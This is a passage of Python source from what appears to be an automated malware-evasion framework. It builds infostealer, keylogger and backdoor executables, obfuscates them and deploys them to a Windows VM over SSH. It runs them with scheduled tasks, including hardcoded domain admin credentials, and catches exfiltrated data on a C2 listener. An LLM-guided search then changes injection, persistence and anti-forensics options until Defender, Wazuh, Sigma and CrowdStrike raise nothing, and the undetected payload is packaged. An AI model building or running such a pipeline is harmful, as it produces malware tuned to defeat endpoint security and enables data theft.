                base[dim] = best_val
                base = apply_constraints(base, malware_type)
                base_alerts = best_count
                improved_this_pass = True
                if base_alerts < best_ever:
                    best_ever = base_alerts
                    best_ever_config = dict(base)
        if not improved_this_pass:
            if base_alerts > 0 and base_alerts <= 20:
                from itertools import combinations
                stuck_dets = evaluate_fn(base, malware_type, max_level=20, exam_name=exam_name)
                evals += 1
                involved = set()
                for det in stuck_dets:
                    try:
                        dj = json.loads(det["log"])
                        dn = dj.get("DetectName", "")
                    except Exception:
                        dn = det.get("hint", "")
                    for dim_k in all_layers:
                        for val_k in all_layers[dim_k]["options"]:
                            from detection_model import BEHAVIORAL_MAP
                            bm = BEHAVIORAL_MAP.get((dim_k, val_k), [])
                            if any(b["detect_name"] == dn for b in bm):
                                involved.add(dim_k)
                    from detection_model import COMBO_DETECTIONS as ALL_COMBOS
                    for combo in ALL_COMBOS:
                        if combo.get("detect_name") == dn:
                            involved.update(combo["conditions"].keys())
                involved_list = [d for d in involved if d in all_layers]
                if len(involved_list) >= 2:
                    pairs_to_try = list(combinations(involved_list[:6], 2))
                elif len(involved_list) == 1:
                    others = [d for d in all_layers if d not in involved]
                    pairs_to_try = [(involved_list[0], o) for o in others[:8]]
                else:
                    pairs_to_try = []
                for d1, d2 in pairs_to_try:
                    if evals >= max_evals:
                        break
                    for v1 in all_layers[d1]["options"]:
                        if evals >= max_evals:
                            break
                        for v2 in all_layers[d2]["options"]:
                            evals += 1
                            test = dict(base)
                            test[d1] = v1
                            test[d2] = v2
                            test = apply_constraints(test, malware_type)
                            td = evaluate_fn(test, malware_type, max_level=20, exam_name=exam_name)
                            if not td:
                                return test, 0, evals
                            if len(td) < best_ever:
                                best_ever = len(td)
                                best_ever_config = dict(test)
                            if evals >= max_evals:
                                break
            restarts += 1
            if restarts > max_restarts:
                break
            rng_restart = random.Random(restarts * 77777)
            dim_order_new = list(all_layers.keys())
            rng_restart.shuffle(dim_order_new)
            dim_order = dim_order_new
            base = {}
            for dim, info in all_layers.items():
                opts = list(info["options"].keys())
                base[dim] = rng_restart.choice(opts)
            base = apply_constraints(base, malware_type)
            base_alerts = len(evaluate_fn(base, malware_type, max_level=20, exam_name=exam_name))
            evals += 1

    return best_ever_config, best_ever, evals


def _sim_build_correlation_batch(config, malware_type, all_layers, evaluate_fn,
                                 exam_name="A"):
    dets = evaluate_fn(config, malware_type, max_level=20, exam_name=exam_name)
    det_tuples = [(d["log"], d.get("hint", d["name"])) for d in dets]
    batch = [(config, det_tuples)]

    for dim in all_layers:
        for val in all_layers[dim]["options"]:
            if val == config.get(dim):
                continue
            var = dict(config)
            var[dim] = val
            var = apply_constraints(var, malware_type)
            if var[dim] != val:
                continue
            var_dets = evaluate_fn(var, malware_type, max_level=20, exam_name=exam_name)
            var_tuples = [(d["log"], d.get("hint", d["name"])) for d in var_dets]
            batch.append((var, var_tuples))

    return batch


def _adapt_on_compile_error(config, compile_err, all_layers, malware_type):
    """Swap out the layer that caused a compile error."""
    new_config = dict(config)
    err_lower = compile_err.lower()
    blamed = set()
    for dim, val in config.items():
        if dim not in all_layers:
            continue
        val_lower = val.lower().replace("_", "")
        if val_lower in err_lower.replace("_", ""):
            blamed.add(dim)
        for token in val.split("_"):
            if len(token) > 3 and token in err_lower:
                blamed.add(dim)
    if not blamed:
        for hint in re.findall(r'(\w+)\.[ch]', compile_err):
            hint_lower = hint.lower()
            for dim, val in config.items():
                if dim not in all_layers:
                    continue
                if hint_lower in val.lower():
                    blamed.add(dim)
    for dim in blamed:
        info = all_layers.get(dim, {})
        options = list(info.get("options", {}).keys())
        current = config.get(dim, "")
        alternatives = [o for o in options if o != current]
        safe = [o for o in alternatives if info["options"][o].get("risk", "high") in ("vlow", "low")]
        pick = safe[0] if safe else (alternatives[0] if alternatives else info.get("default", current))
        print(f"  Compile fix: {dim}: {current} -> {pick}", flush=True)
        new_config[dim] = pick
    if not blamed:
        print(f"  Compile fix: could not identify failing layer, resetting to defaults", flush=True)
        for dim, info in all_layers.items():
            new_config[dim] = info.get("default", new_config.get(dim, ""))
    new_config = apply_constraints(new_config, malware_type)
    return new_config


def _adapt_on_detection(config, deploy_batch, all_layers, malware_type,
                        llm_url, strategy_history, det_text, run_num):
    """Adapt config after real detection using LLM correlation + algorithmic fallback.

    Uses accumulated deploy_batch (config, detections) pairs for correlation.
    Falls back to select_layers if LLM fails or returns nothing.
    """
    new_config = dict(config)

    if len(deploy_batch) >= 1:
        print(f"  LLM correlation ({len(deploy_batch)} deploy(s))...", end="", flush=True)
        try:
            strategy = _llm_strategy_call(
                llm_url, deploy_batch, all_layers, None,
                20, malware_type, strategy_history,
                {}, 0, base_config=config)
            changes = strategy.get("changes", {})
            if changes:
                for dim, val in changes.items():
                    new_config[dim] = val
                new_config = apply_constraints(new_config, malware_type)
                print(f" {len(changes)} changes", flush=True)
                strategy_history.append({
                    "batch": run_num, "changes": changes,
                    "outcome": "detected_real",
                    "best_alerts": -1,
                    "real_detection": det_text[:500],
                })
                return new_config
            else:
                print(f" no changes", flush=True)
        except Exception as e:
            print(f" error: {e}", flush=True)

    print(f"  Algorithmic fallback (select_layers)...", flush=True)
    new_config = select_layers(det_text, "", new_config,
                               run_index=run_num, malware_type=malware_type)
    return new_config


def _parse_real_detections(defender_text, wazuh_text, sigma_text, cs_text=""):
    """Parse real detection output into batch-compatible (det_json, det_name) tuples."""
    detections = []

    if cs_text:
        for line in cs_text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            if line.startswith("CrowdStrike:"):
                parts = line.split(" — ", 1)
                det_name = parts[0].strip()
                desc = parts[1].strip() if len(parts) > 1 else det_name
                severity = "Critical" if "Quarantined" in det_name or "Killed" in det_name else "Medium"
                det_json = json.dumps({
                    "DetectName": det_name,
                    "DetectDescription": desc,
                    "SeverityName": severity,
                    "Tactic": "Defense Evasion",
                    "Technique": "CrowdStrike Falcon Detection",
                })
                detections.append((det_json, det_name))

    if defender_text:
        for threat in re.findall(r'ThreatName\s*:\s*(.+)', defender_text):
            threat = threat.strip()
            det_name = f"Defender:{threat}"
            det_json = json.dumps({
                "DetectName": det_name,
                "DetectDescription": (
                    f"Windows Defender detected {threat}. "
                    f"Binary quarantined — static or behavioral signature match."
                ),
                "SeverityName": "Critical",
                "Tactic": "Defense Evasion",
                "Technique": "Malware Detection",
            })
            detections.append((det_json, det_name))
        if not detections and defender_text.strip():
            det_name = "Defender:Unknown"
            det_json = json.dumps({
                "DetectName": det_name,
                "DetectDescription": defender_text.strip()[:300],
                "SeverityName": "High",
                "Tactic": "", "Technique": "",
            })
            detections.append((det_json, det_name))

    if wazuh_text:
        for line in wazuh_text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            m = re.match(r'WAZUH Level=(\d+) \[(\d+)\] (.+?)(?:\s+MITRE:(.+))?$', line)
            if m:
                level, rule_id, desc, mitre = m.groups()
                det_name = f"Wazuh:{rule_id}:{desc[:40]}"
                det_json = json.dumps({
                    "DetectName": det_name,
                    "DetectDescription": desc.strip()[:200],
                    "SeverityName": "High" if int(level) >= 12 else "Medium",
                    "Tactic": mitre or "", "Technique": "",
                })
                detections.append((det_json, det_name))

    if sigma_text:
        for line in sigma_text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            m = re.match(r'SIGMA (\w+): (.+)', line)
            if m:
                severity, name = m.groups()
                det_name = f"Sigma:{name.strip()[:60]}"
                det_json = json.dumps({
                    "DetectName": det_name,
                    "DetectDescription": name.strip(),
                    "SeverityName": severity.capitalize(),
                    "Tactic": "", "Technique": "",
                })
                detections.append((det_json, det_name))

    return detections


def _apply_batch_strategy(deploy_batch, all_layers, malware_type, llm_url,
                          strategy_history, locked, suggested, suggest_idx,
                          last_clean_config, resets_done, llm_calls, batch_num):
    """Run LLM strategy analysis on accumulated deploy batch (exam-proven pattern).

    Ported from test_evasion_loop.py's run_exam() which passed L18-20 on all exams.
    Mutates locked/suggested/suggest_idx in-place to guide _build_next_config.
    """
    curr_det_names = set()
    for _, dets in deploy_batch:
        for det_json, det_name in dets:
            curr_det_names.add(det_name)

    best_alerts = min((len(dets) for _, dets in deploy_batch), default=0)

    if strategy_history:
        prev_det_names = set(strategy_history[-1].get("detection_names", []))
        prev_best = strategy_history[-1].get("best_alerts", 999)
        if curr_det_names == prev_det_names:
            outcome = "no_improvement"
        elif best_alerts < prev_best:
            outcome = "improved"
        elif len(curr_det_names) < len(prev_det_names):
            outcome = "changed"
        else:
            outcome = "changed"
    else:
        outcome = "initial"

    print(f"\n  ┌─ LLM Strategy #{llm_calls + 1} [{outcome}] "
          f"({len(deploy_batch)} deploys, {len(curr_det_names)} detection types)", flush=True)

    try:
        strategy = _llm_strategy_call(
            llm_url, deploy_batch, all_layers, last_clean_config,
            20, malware_type, strategy_history,
            locked, resets_done)

        action = strategy.get("action", "explore")
        new_locks = strategy.get("lock", {})
        new_explore = strategy.get("explore", [])
        new_suggest = strategy.get("suggest", {})
        reasoning = strategy.get("reasoning", "")[:150]
        force_explore = set()

        smart_reset_needed = False
        if len(strategy_history) >= 3:
            recent3 = strategy_history[-3:]
            if all(h.get("outcome") == "no_improvement" for h in recent3):
                smart_reset_needed = True
        if not smart_reset_needed and len(strategy_history) >= 5:
            recent5 = strategy_history[-5:]
            if all(h.get("best_alerts", 999) > 0 for h in recent5):
                smart_reset_needed = True

        if smart_reset_needed:
            recent = strategy_history[-min(5, len(strategy_history)):]
            always_locked = None
            for h in recent:
                hlocks = set(h.get("new_locks", {}).keys())
                if always_locked is None:
                    always_locked = hlocks
                else:
                    always_locked &= hlocks
            det_dims = set()
            kw_map = {
                "exfil": ["network", "connection", "tcp", "http", "cloud",
                          "sync", "exfil", "transfer", "named pipe"],
                "process": ["process", "parent", "child", "tree", "ppid",
                            "behavioral profile", "sideload"],
                "api_resolve": ["import", "api", "syscall", "ntdll", "hash"],
                "timing": ["sleep", "delay", "burst", "timing",
                          "immediate", "execution", "launch", "pacing"],
                "collection_strategy": ["credential", "bulk", "access",
                                        "collection", "rapid", "data store"],
                "persistence": ["persist", "registry", "startup", "scheduled"],
                "injection_method": ["inject", "hollowing", "apc", "thread"],
                "sleep_mode": ["sleep", "encrypt", "obfuscat"],
                "kernel_evasion": ["driver", "kernel", "byovd"],
                "anti_forensics": ["forensic", "self.delete", "timestomp"],
                "data_staging": ["staging", "temp", "pipe"],
            }
            for _, dets in deploy_batch:
                for det_json, _ in dets:
                    try:
                        desc = json.loads(det_json).get(
                            "DetectDescription", "").lower()
                        for dim, kws in kw_map.items():
                            if any(kw in desc for kw in kws):
                                det_dims.add(dim)
                    except (json.JSONDecodeError, KeyError):
                        pass
            force_explore = (always_locked or set()) & det_dims
            if not force_explore:
                force_explore = always_locked or det_dims or {"process", "exfil"}
            action = "reset"
            new_suggest = {}
            for dim in force_explore:
                if dim in all_layers:
                    opts = list(all_layers[dim]["options"].keys())
                    current_val = (last_clean_config or {}).get(dim)
                    others = [o for o in opts if o != current_val]
                    random.shuffle(others)
                    new_suggest[dim] = others
            trigger = "3x no_improvement" if (
                len(strategy_history) >= 3 and
                all(h.get("outcome") == "no_improvement"
                    for h in strategy_history[-3:])
            ) else f"5x failed (best={best_alerts} alerts)"
            print(f"  │  SMART RESET: {trigger}, "
                  f"force-exploring {list(force_explore)}", flush=True)

        strategy_history.append({
            "batch": batch_num,
            "action": action,
            "new_locks": dict(new_locks),
            "explored": list(new_explore),
            "changes": strategy.get("changes", {}),
            "suggested": {k: list(v) if isinstance(v, list) else [v]
                          for k, v in new_suggest.items()},
            "reasoning": strategy.get("reasoning", ""),
            "outcome": outcome,
            "detection_names": list(curr_det_names),
            "best_alerts": best_alerts,
            "_resets_done": resets_done,
        })

        if action == "reset":
            resets_done += 1
            old_lock_count = len(locked)
            locked.clear()
            suggested.clear()
            suggest_idx.clear()

            for dim, vals in new_suggest.items():
                suggested[dim] = vals
                suggest_idx[dim] = 0

            tried_vals = {}
            for h in strategy_history:
                for dim, val in h.get("changes", {}).items():
                    tried_vals.setdefault(dim, set()).add(val)
            for dim in force_explore:
                if dim not in suggested and dim in all_layers:
                    opts = list(all_layers[dim]["options"].keys())
                    fresh = [o for o in opts if o not in tried_vals.get(dim, set())]
                    if fresh:
                        random.shuffle(fresh)
                        suggested[dim] = fresh
                        suggest_idx[dim] = 0
            strategy_history[-1]["_resets_done"] = resets_done
            print(f"  │  RESET #{resets_done} — wiped {old_lock_count} locks, "
                  f"forced new direction", flush=True)
            if reasoning:
                print(f"  │  {reasoning}", flush=True)
            if new_suggest:
                sug_str = ", ".join(f"{k}=[{','.join(str(x) for x in v)}]"
                                    for k, v in new_suggest.items())
                print(f"  │  LLM direction: {sug_str}", flush=True)
            print(f"  └─", flush=True)
        else:
            locked.update(new_locks)
            for dim in new_explore:
                locked.pop(dim, None)
                if dim in all_layers:
                    opts = list(all_layers[dim]["options"].keys())
                    preferred = new_suggest.get(dim, [None])[0] if dim in new_suggest else None
                    current_val = (last_clean_config or {}).get(dim)
                    others = [o for o in opts if o != preferred and o != current_val]
                    random.shuffle(others)
                    full_list = []
                    if preferred and preferred in all_layers[dim]["options"]:
                        full_list.append(preferred)
                    if current_val and current_val != preferred:
                        full_list.append(current_val)
                    full_list.extend(others)
                    suggested[dim] = full_list
                    suggest_idx[dim] = 0
            for dim, vals in new_suggest.items():
                if dim not in new_explore:
                    suggested[dim] = vals if isinstance(vals, list) else [vals]
                    suggest_idx[dim] = 0

            lock_str = ", ".join(f"{k}={v}" for k, v in new_locks.items()) if new_locks else "none"
            explore_str = ", ".join(new_explore) if new_explore else "none"
            print(f"  │  lock [{lock_str}], explore [{explore_str}]", flush=True)
            if reasoning:
                print(f"  │  {reasoning}", flush=True)
            print(f"  └─ State: {len(locked)} locked, {resets_done} resets, "
                  f"{len(strategy_history)} strategies", flush=True)

    except Exception as e:
        print(f"  │  LLM error: {e}", flush=True)
        strategy_history.append({
            "batch": batch_num, "action": "error",
            "new_locks": {}, "explored": [], "suggested": {},
            "reasoning": f"LLM error: {e}",
            "outcome": outcome, "detection_names": list(curr_det_names),
            "best_alerts": best_alerts,
            "_resets_done": resets_done,
        })
        locked.clear()
        suggested.clear()
        suggest_idx.clear()
        det_dims = set()
        kw_map = {
            "exfil": ["network", "connection", "tcp", "http", "smb", "dns", "exfil",
                      "cloud", "sync", "upload", "transfer", "paste", "named pipe"],
            "process": ["process", "parent", "child", "tree", "spawn", "ppid"],
            "api_resolve": ["import", "api", "syscall", "ntdll", "unhook", "hash", "peb"],
            "timing": ["sleep", "delay", "timing", "burst",
                      "immediate", "execution", "launch", "pacing"],
            "collection_strategy": ["credential", "bulk", "access",
                                    "collection", "rapid", "data store"],
            "persistence": ["persist", "registry", "startup", "scheduled"],
            "injection_method": ["inject", "remote thread", "apc", "hollowing"],
        }
        for _, dets in deploy_batch:
            for det_json, _ in dets:
                try:
                    desc = json.loads(det_json).get("DetectDescription", "").lower()
                    for dim, kws in kw_map.items():
                        if dim in all_layers and any(kw in desc for kw in kws):
                            det_dims.add(dim)
                except (json.JSONDecodeError, KeyError):
                    pass
        if not det_dims:
            det_dims = {"exfil", "process"}
        for dim in det_dims:
            if dim in all_layers:
                opts = list(all_layers[dim]["options"].keys())
                current_val = locked.get(dim) or (last_clean_config or {}).get(dim)
                opts = [o for o in opts if o != current_val]
                random.shuffle(opts)
                suggested[dim] = opts
                suggest_idx[dim] = 0
        print(f"  └─ Error fallback: shuffled detection-relevant dims: {det_dims}", flush=True)


def run_hybrid_loop(
    malware_type="infostealer",
    c2_ip="10.0.2.2",
    c2_port=9001,
    max_rounds=50,
    batch_size=3,
    assembler_path=None,
    llm_url=None,
    vm_port=10022,
    vm_user="vmuser",
    vm_pass="vmuser123",
    dry_run=False,
    use_sim=False,
):
    """Real-detection evasion loop v6 — exam-proven algo+LLM hybrid.

    Ported from test_evasion_loop.py's run_exam() which passed L18-20 on all exams.
    Uses _build_next_config with locked/suggested/suggest_idx state management.
    Accumulates batch_size deploys before LLM strategy analysis.
    Smart auto-reset when stuck.

    With use_sim=True: run simulation hill-climb first as pre-screening,
    then deploy the sim-clean config to VM.
    """
    if llm_url is None:
        llm_url = os.environ.get("LLM_URL", "http://localhost:11235")
    if assembler_path is None:
        assembler_path = str(CHUNKS_DIR / "assembler.py")

    import subprocess
    import tempfile
    import time

    history = load_history()
    results_log = []
    all_layers = get_all_layers(malware_type)

    locked = {}
    suggested = {}
    suggest_idx = {}
    strategy_history = []
    deploy_batch = []
    last_clean_config = None
    resets_done = 0
    llm_calls = 0
    batch_num = 0

    mode = "sim+real" if use_sim else "real-only"
    print(f"\n{'='*60}", flush=True)
    print(f"  Evasion Loop v6: {malware_type} ({mode})", flush=True)
    print(f"  Deploy -> batch({batch_size}) -> LLM strategy -> adapt -> repeat", flush=True)
    print(f"  Max rounds: {max_rounds} | Batch size: {batch_size}", flush=True)
    print(f"{'='*60}\n", flush=True)

    subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
    time.sleep(0.5)

    config = None
    if history["runs"]:
        for r in reversed(history["runs"]):
            if r.get("success") and r.get("config"):
                config = dict(r["config"])
                last_clean_config = dict(config)
                print(f"  Starting from last successful config", flush=True)
                break

    if config is None:
        config = {}
        for layer, info in all_layers.items():
            config[layer] = info["default"]
        config = apply_constraints(config, malware_type)

    # ══ Optional: simulation pre-screening ══
    if use_sim:
        print(f"  [sim] Running hill-climb pre-screen...", end="", flush=True)
        try:
            from test_evasion_loop import evaluate_config
            sim_config, sim_alerts, sim_evals = _sim_hill_climb(
                config, malware_type, all_layers, evaluate_config,
                max_evals=2000, max_restarts=30)
            if sim_alerts == 0:
                config = sim_config
                print(f" CLEAN in {sim_evals} evals", flush=True)
            else:
                print(f" best={sim_alerts} alerts in {sim_evals} evals", flush=True)
                batch = _sim_build_correlation_batch(
                    sim_config, malware_type, all_layers, evaluate_config)
                strategy = _llm_strategy_call(
                    llm_url, batch, all_layers, None,
                    20, malware_type, strategy_history,
                    {}, 0, base_config=sim_config)
                changes = strategy.get("changes", {})
                if changes:
                    for dim, val in changes.items():
                        sim_config[dim] = val
                    sim_config = apply_constraints(sim_config, malware_type)
                config = sim_config
        except Exception as e:
            print(f" skip ({e})", flush=True)

    for run_num in range(1, max_rounds + 1):

        if run_num > 1:
            config = _build_next_config(all_layers, locked, suggested, suggest_idx,
                                         run_num - 1, malware_type, last_clean_config)

        print(f"\n{'='*60}", flush=True)
        print(f"  Round {run_num}/{max_rounds} [B{batch_num + 1}.{len(deploy_batch) + 1}]", flush=True)
        print(f"{'='*60}", flush=True)
        print(format_selection_report(config, malware_type), flush=True)

        if dry_run:
            print("  [DRY RUN] Would assemble > compile > deploy > validate", flush=True)
            record_run(config, detected=False, success=False)
            results_log.append("D")
            continue

        # ══ Build ══

        print("  [1/5] Assembling...", end="", flush=True)
        recipe_content = config_to_recipe(config, malware_type)
        recipe_path = tempfile.mktemp(suffix=".yaml")
        recipe_text = recipe_content
        with open(recipe_path, "w") as f:
            f.write(recipe_content)
        src_path = tempfile.mktemp(suffix=".c")
        result = subprocess.run(["python3", assembler_path, recipe_path, "-o", src_path],
                                capture_output=True, text=True)
        os.unlink(recipe_path)
        if result.returncode != 0:
            print(f" FAIL\n    {result.stderr.strip()[:200]}", flush=True)
            record_run(config, detected=False, success=False)
            results_log.append("E")
            continue
        print(" OK", flush=True)

        with open(src_path) as f:
            src = f.read()
        src = src.replace("{{C2_IP}}", c2_ip).replace("{{C2_PORT}}", str(c2_port))

        obf_level = os.environ.get("MALGEN_OBFUSCATION", "heavy")
        if obf_level != "none":
            print(f"  [2/5] Obfuscating ({obf_level})...", end="", flush=True)
            try:
                import importlib.util
                _obf_path = str(CHUNKS_DIR / "obfuscate.py")
                _spec = importlib.util.spec_from_file_location("obfuscate", _obf_path)
                _mod = importlib.util.module_from_spec(_spec)
                _spec.loader.exec_module(_mod)
                src = _mod.obfuscate(src, level=obf_level, llm_url=llm_url)
                print(" OK", flush=True)
            except Exception as e:
                print(f" skip ({e})", flush=True)
        else:
            print("  [2/5] Obfuscation: off", flush=True)

        obfuscated_source = src
        with open(src_path, "w") as f:
            f.write(src)

        print("  [3/5] Compiling...", end="", flush=True)
        exe_path = src_path.replace(".c", ".exe")
        cr = subprocess.run(
            ["x86_64-w64-mingw32-gcc", "-mwindows", "-o", exe_path, src_path,
             "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
             "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
             "-lwldap32", "-lnetapi32", "-lmpr",
             "-static", "-s", "-Wl,--strip-all"],
            capture_output=True, text=True)
        os.unlink(src_path)
        if cr.returncode != 0:
            compile_err = cr.stderr.strip()
            print(f" FAIL\n    {compile_err[:200]}", flush=True)
            run_data = {"config": config, "detected": False, "success": False, "compile_error": compile_err}
            history["runs"].append(run_data)
            save_history(history)
            results_log.append("E")
            config = _adapt_on_compile_error(config, compile_err, all_layers, malware_type)
            continue
        exe_size = os.path.getsize(exe_path)
        print(f" OK ({exe_size:,} bytes)", flush=True)

        # ══ Deploy ══

        ssh = f"sshpass -p '{vm_pass}' ssh -o StrictHostKeyChecking=no -p {vm_port} {vm_user}@localhost"
        scp = f"sshpass -p '{vm_pass}' scp -o StrictHostKeyChecking=no -P {vm_port}"

        print("  [4/5] Deploying...", end="", flush=True)
        subprocess.run(f"{scp} {exe_path} {vm_user}@localhost:'C:\\Users\\{vm_user}\\Desktop\\payload.exe'",
                       shell=True, capture_output=True)
        time.sleep(2)

        exists = subprocess.run(f"{ssh} 'if exist C:\\Users\\{vm_user}\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)'",
                                shell=True, capture_output=True, text=True)
        if "GONE" in exists.stdout:
            det_cmd = get_detection_cmd()
            det = subprocess.run(f"""{ssh} '{det_cmd}'""",
                                 shell=True, capture_output=True, text=True)
            defender_text = det.stdout.strip()
            wazuh_text = check_wazuh_indexer(minutes=3, min_level=5)
            cs_fail, cs_text = check_crowdstrike(
                vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass,
                check_binary=False)
            if not defender_text and not cs_text and "crowdstrike" in get_active_edrs():
                cs_fail = True
                cs_text = "CrowdStrike:Quarantined — Falcon removed binary on write"
            print(f" QUARANTINED", flush=True)
            all_det_text = defender_text
            if wazuh_text:
                all_det_text = f"{all_det_text}\n{wazuh_text}" if all_det_text else wazuh_text
            if cs_text:
                all_det_text = f"{all_det_text}\n{cs_text}" if all_det_text else cs_text
            if all_det_text:
                print(f"    {all_det_text[:200]}", flush=True)
            record_run(config, detected=True, detection_text=all_det_text, success=False)
            os.unlink(exe_path)
            history = load_history()
            results_log.append("F" if cs_fail else "X")

            parsed_dets = _parse_real_detections(defender_text, wazuh_text, "", cs_text)
            deploy_batch.append((config.copy(), parsed_dets if parsed_dets else []))

            if len(deploy_batch) >= batch_size:
                _apply_batch_strategy(
                    deploy_batch, all_layers, malware_type, llm_url,
                    strategy_history, locked, suggested, suggest_idx,
                    last_clean_config, resets_done, llm_calls, batch_num)
                llm_calls += 1
                batch_num += 1
                resets_done = strategy_history[-1].get("_resets_done", resets_done) if strategy_history else resets_done
                deploy_batch = []
            continue

        print(" OK (survived AV/EDR)", flush=True)

        # ══ Execute + validate ══

        print("  [5/5] Executing + C2 capture...", end="", flush=True)
        c2_out = tempfile.mktemp(suffix=".bin")
        subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
        time.sleep(0.5)
        c2_script = (
            f"import socket\n"
            f"srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            f"srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            f"srv.bind(('0.0.0.0', {c2_port})); srv.listen(1); srv.settimeout(90)\n"
            f"try:\n"
            f"    conn, addr = srv.accept()\n"
            f"    data = b''; conn.settimeout(30)\n"
            f"    while True:\n"
            f"        try:\n"
            f"            chunk = conn.recv(65536)\n"
            f"            if not chunk: break\n"
            f"            data += chunk\n"
            f"        except socket.timeout: break\n"
            f"    conn.close()\n"
            f"    with open('{c2_out}', 'wb') as f: f.write(data)\n"
            f"except socket.timeout:\n"
            f"    open('{c2_out}', 'wb').close()\n"
            f"srv.close()\n"
        )
        listener = subprocess.Popen(["python3", "-u", "-c", c2_script])
        time.sleep(1)
        if malware_type == "keylogger":
            subprocess.run(f"{ssh} 'schtasks /create /tn evasion_test /tr "
                           f"\"C:\\Users\\{vm_user}\\Desktop\\payload.exe --batch 15\" "
                           f"/sc once /st 00:00 /f /it /rl highest'",
                           shell=True, capture_output=True)
            subprocess.run(f"{ssh} 'schtasks /run /tn evasion_test'",
                           shell=True, capture_output=True)
        elif malware_type == "infostealer":
            domain_check = subprocess.run(
                f"{ssh} 'powershell -Command \"(Get-WmiObject Win32_ComputerSystem).PartOfDomain\"'",
                shell=True, capture_output=True, text=True)
            if "True" in domain_check.stdout:
                run_user = "MALWARE\\it.admin"
                run_pass = "Adm1nP@ss!"
                schtask_cred = f'/ru "{run_user}" /rp "{run_pass}"'
            else:
                schtask_cred = f'/ru "{vm_user}" /rp "{vm_pass}"'
            subprocess.run(f"""{ssh} 'schtasks /create /tn evasion_test /tr """
                           f""""C:\\Users\\{vm_user}\\Desktop\\payload.exe" """
                           f"""/sc once /st 00:00 /f {schtask_cred}'""",
                           shell=True, capture_output=True)
            subprocess.run(f"{ssh} 'schtasks /run /tn evasion_test'",
                           shell=True, capture_output=True)
        else:
            subprocess.Popen(f"{ssh} 'cmd /c \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\"'",
                             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        listener.wait()
        if malware_type in ("keylogger", "infostealer"):
            subprocess.run(f"{ssh} 'schtasks /delete /tn evasion_test /f'",
                           shell=True, capture_output=True)
        c2_size = os.path.getsize(c2_out) if os.path.exists(c2_out) else 0
        time.sleep(5)
        subprocess.run(f"{ssh} 'taskkill /f /im payload.exe 2>NUL'",
                       shell=True, capture_output=True)
        subprocess.run(f"{ssh} 'del \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\" 2>NUL'",
                       shell=True, capture_output=True)
        wazuh_det = check_wazuh_indexer(minutes=3, min_level=8)
        print(f" checking Sigma...", end="", flush=True)
        sigma_det = check_sigma_rules(vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass)
        cs_fail, cs_det = check_crowdstrike(
            vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass,
            check_binary=True, c2_rc=0 if c2_size > 0 else 1)
        c2_threshold = 4 if malware_type == "backdoor" else 100
        if c2_size > c2_threshold and not wazuh_det and not sigma_det and not cs_fail:
            print(f" SUCCESS ({c2_size:,} bytes)", flush=True)
            record_run(config, detected=False, success=True)

            deploy_batch.append((config.copy(), []))

            import shutil
            ts = time.strftime("%Y%m%d_%H%M%S")
            results_root = Path(__file__).parent.parent.parent / "results"
            pkg_dir = results_root / f"chunk_{malware_type}_{ts}"
            pkg_dir.mkdir(parents=True, exist_ok=True)
            (pkg_dir / "source.c").write_text(obfuscated_source)
            (pkg_dir / "recipe.yaml").write_text(recipe_text)
            if os.path.exists(exe_path):
                shutil.copy2(exe_path, str(pkg_dir / "payload.exe"))
            if os.path.exists(c2_out) and c2_size > 0:
                shutil.copy2(c2_out, str(pkg_dir / f"exfil_{ts}.bin"))
            (pkg_dir / "build_info.txt").write_text(
                f"type: {malware_type}\n"
                f"run: {run_num}/{max_rounds}\n"
                f"c2_bytes: {c2_size}\n"
                f"binary_size: {exe_size}\n"
                f"obfuscation: {obf_level}\n"
                f"config: {config}\n"
            )
            generate_deploy_script(malware_type, c2_port, pkg_dir)
            latest = results_root / "latest"
            latest.unlink(missing_ok=True)
            latest.symlink_to(pkg_dir.name)
            print(f"  Package: {pkg_dir}/", flush=True)
            if os.path.exists(c2_out):
                os.unlink(c2_out)
            if os.path.exists(exe_path):
                os.unlink(exe_path)
            results_log.append("S")
            print(f"\n{'='*60}", flush=True)
            print(f"  SUCCESS on round {run_num}/{max_rounds}", flush=True)
            cs_events = f" | CrowdStrike: {cs_det[:30]}" if cs_det else " | CrowdStrike: clean"
            print(f"  Defender: 0 | Wazuh: 0 high | Sigma: 0 med+{cs_events} | C2: {c2_size:,} bytes", flush=True)
            print(f"  Runs: {''.join(results_log)}", flush=True)
            print(f"{'='*60}", flush=True)
            return True, config, run_num, load_history()
        else:
            det_cmd = get_detection_cmd()
            det = subprocess.run(f"""{ssh} '{det_cmd}'""",
                                 shell=True, capture_output=True, text=True)
            defender_text = det.stdout.strip()
            all_det_text = defender_text
            if wazuh_det:
                all_det_text = f"{all_det_text}\n{wazuh_det}" if all_det_text else wazuh_det
            if sigma_det:
                all_det_text = f"{all_det_text}\n{sigma_det}" if all_det_text else sigma_det
            if cs_fail and cs_det:
                all_det_text = f"{all_det_text}\n{cs_det}" if all_det_text else cs_det
            detected = bool(all_det_text)
            if cs_fail:
                print(f" CROWDSTRIKE\n    {cs_det[:200]}", flush=True)
                results_log.append("F")
            elif sigma_det:
                print(f" SIGMA ALERT\n    {sigma_det[:200]}", flush=True)
                results_log.append("R")
            elif wazuh_det:
                print(f" WAZUH ALERT\n    {wazuh_det[:200]}", flush=True)
                results_log.append("W")
            elif detected:
                print(f" DETECTED\n    {all_det_text[:200]}", flush=True)
                results_log.append("X")
            else:
                print(f" no C2 data ({c2_size} bytes)", flush=True)
                results_log.append("?")
            record_run(config, detected=detected,
                       detection_text=all_det_text or "no_c2_data", success=False)
            if os.path.exists(c2_out):
                os.unlink(c2_out)
            if os.path.exists(exe_path):
                os.unlink(exe_path)
            history = load_history()

            parsed_dets = _parse_real_detections(
                defender_text, wazuh_det or "", sigma_det or "",
                cs_det if cs_fail else "")
